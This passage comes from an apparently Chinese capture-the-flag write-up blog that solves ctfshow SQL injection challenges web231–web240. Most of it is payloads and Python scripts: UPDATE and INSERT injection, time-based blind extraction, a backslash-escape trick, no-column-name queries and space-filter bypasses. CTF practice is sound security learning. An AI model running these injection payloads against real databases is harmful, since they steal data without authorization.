<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103537495.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409103537495"></p>

<p>还是这里找发送参数</p>
<p>简单闭合一下</p>
<pre><code>update ctfshow_user set pass = &#39;1&#39;,username=user() where 1=1#&#39; where username = &#39;1&#39;;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103848475.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409103848475"></p>

<pre><code>POST
password=1&#39;,username=user()#&amp;username=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409103833385.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409103833385"></p>

<pre><code>POST
password=1&#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) #&amp;username=1
</code></pre>
<pre><code>POST
password=1&#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flaga&#39;)#&amp;username=1
</code></pre>
<pre><code>POST
password=1&#39;,username=(select flagas from flaga)#&amp;username=1
password=1&#39;,username=(select a from (select group_concat(flagas)a from flaga) 1) ;#&amp;username=1
</code></pre>
<h1 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409104334331.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409104334331"></p>

<pre><code>POST
password=1&#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;username=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105435149.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409105435149"></p>

<pre><code>POST
password=1&#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=&#39;flagaa&#39;)#&amp;username=1
</code></pre>
<pre><code>password=1&#39;),username=(select flagass from flagaa)#&amp;username=1
password=1&#39;),username=(select a from (select group_concat(flagas)a from flaga) 111) ;#&amp;username=1
</code></pre>
<h1 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h1><h2 id="updata盲注"><a href="#updata盲注" class="headerlink" title="updata盲注"></a>updata盲注</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409105751661.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409105751661"></p>

<p>盲注</p>
<p>测试</p>
<pre><code class="python">import requests
url = &quot;http://ad2cbb74-6e31-4f3d-bffc-6d989a5760f7.challenge.ctf.show/api/&quot;
payload = &quot;length(database())=0&quot; #没延迟
payload = &quot;length(database())&gt;0&quot; #延迟
date = &#123;
    &#39;username&#39;: f&quot;1&#39; or if(&#123;payload&#125;,sleep(0.05),1) #&quot;,
    &#39;password&#39;: &quot;0&quot;
&#125;
try:
    r = requests.post(url, data=date, timeout=0.9)
    print(&#39;没延迟&#39;)
except Exception as e:
    print(&#39;延迟&#39;)
</code></pre>
<pre><code class="python">&quot;&quot;&quot;
Author:Y4tacker
&quot;&quot;&quot;
import requests

url = &quot;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1&amp;limit=10&quot;

result = &quot;&quot;
i = 0

while 1:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # 查数据库
        # payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;
        # 查表名
        # payload = &quot;select column_name from information_schema.columns where table_name=&#39;flag233333&#39; limit 1,1&quot;
        # 查数据
        payload = &quot;select flagass233 from flag233333&quot;
        data = &#123;
            &#39;username&#39;: f&quot;1&#39; or if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.05),1)#&quot;,
            &#39;password&#39;: &#39;4&#39;
        &#125;
        try:
            r = requests.post(url, data=data, timeout=0.9)
            tail = mid
        except Exception as e:
            head = mid + 1
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

</code></pre>
<h1 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h1><h2 id="逃逸字符"><a href="#逃逸字符" class="headerlink" title="\逃逸字符"></a>\逃逸字符</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115745252.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409115745252"></p>

<p>单引号被过滤了,但是可以通过 \ 逃逸字符</p>
<pre><code>$sql = &quot;update ctfshow_user set pass = &#39;&#123;$password&#125;&#39; where username = &#39;&#123;$username&#125;&#39;;&quot;;
</code></pre>
<p>就像这样,我们给pass传入一个 \ 那么这个’就被转义了</p>
<pre><code>$sql = &quot;update ctfshow_user set pass = &#39;\&#39; where username = &#39;$username&#39;;&quot;;
</code></pre>
<p>也就是这个才是’\‘ where username &#x3D; ‘pass那么后面的username自然就受我们控制了,比如我们这样闭合</p>
<pre><code>$sql = &quot;update ctfshow_user set pass = &#39;\&#39; where username = &#39;,username=select database()#&#39;;&quot;;
</code></pre>
<p>,username&#x3D;select database()#这一部分就是我们传入的username的值</p>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115907938.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409115907938"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409115915740.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409115915740"></p>

<p>传数据库名的时候记得用十六进制哦 ‘’ 被过滤了</p>
<pre><code>username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#&amp;password=\
</code></pre>
<h1 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h1><h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120324788.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120324788"></p>

<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/134678.htm">概述MySQL统计信息</a>   <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">CTF|mysql之无列名注入</a></p>
<pre><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120619242.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120611609"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120634772.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120634772"></p>

<pre><code>username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\
</code></pre>
<p>或者</p>
<pre><code>username=,username=(select `2` from(select 1,2,3 union select * from flag23a1 limit 1,1)a)#&amp;password=\
</code></pre>
<h1 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120851488.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120851488"></p>

<pre><code>username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#&amp;password=\
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120950191.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120950191"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409120958493.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409120958493"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121038900.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121038900"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121050832.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121050832"></p>

<h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h2 id="inster注入"><a href="#inster注入" class="headerlink" title="inster注入"></a>inster注入</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121236464.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121236464"></p>

<pre><code>username=3&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121533936.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121533936"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121540848.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121540848"></p>

<pre><code>username=3&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;));-- A&amp;password=1
</code></pre>
<pre><code>username=3&#39;,(select flagass23s3 from flag));-- A&amp;password=1
</code></pre>
<h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409121935402.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409121935402"></p>

<pre><code>username=3&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122028791.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409122028791"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409122041955.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409122041955"></p>

<pre><code>username=3&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flagb&#39;)));#&amp;password=1
</code></pre>
<pre><code>username=3&#39;,(select(flag)from(flagb)));#&amp;password=1
</code></pre>
<h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h2 id="过滤or-空格"><a href="#过滤or-空格" class="headerlink" title="过滤or 空格"></a>过滤or 空格</h2><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123445710.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409123445710"></p>

<pre><code>username=1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=1
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123642991.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409123642991"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409123657096.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409123657096"></p>

<p>不会查列名</p>
<pre><code>username=1&#39;,(select(flag)from(flagbb)));#&amp;password=1
</code></pre>
<h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409124924898.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220409124924898"></p>

<pre><code class="python">import random
import requests

url = &quot;http://d9a27e7b-ab91-4d9e-86c7-89a30a22acf3.challenge.ctf.show&quot;
url_insert = url + &quot;/api/insert.php&quot;
url_flag = url + &quot;/api/?page=1&amp;limit=1000&quot;


# 看命函数
def generate_random_str():
    sttr = &#39;ab&#39;
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = &#39;&#39;.join(str_list)
    return random_str


while 1:
    data = &#123;
        &#39;username&#39;: f&quot;1&#39;,(select(flag)from(flag&#123;generate_random_str()&#125;)))#&quot;,
        &#39;password&#39;: &quot;&quot;
    &#125;
    r = requests.post(url_insert, data=data)
    r2 = requests.get(url_flag)
    if &quot;ctfshow&#123;&quot; in r2.text:
        for i in r2.json()[&#39;data&#39;]:
            if  &quot;ctfshow&#123;&quot; in i[&#39;pass&#39;]:
                print(i[&#39;pass&#39;])
                break
        break
</code></pre>
